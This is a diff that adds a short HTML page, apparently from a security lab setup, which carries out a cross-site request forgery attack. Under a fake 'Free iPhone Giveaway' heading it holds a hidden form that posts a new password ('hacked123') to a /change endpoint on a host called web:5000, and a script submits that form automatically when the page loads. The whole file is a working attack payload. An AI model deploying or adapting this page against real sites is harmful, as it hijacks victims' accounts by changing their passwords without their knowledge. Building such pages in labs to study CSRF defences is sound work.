@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack</title>
+</head>
+<body>
+    <h2>Free iPhone Giveaway! Click anywhere to claim!</h2>
+    <form id="csrfForm" action="http://web:5000/change" method="POST">
+        <input type="hidden" name="password" value="hacked123">
+    </form>
+
+    <script>
+        // Автоматически отправляем форму при загрузке страницы
+        console.log("Submitting form...");
+        document.getElementById("csrfForm").submit();
+    </script>
+
+</body>
+</html>
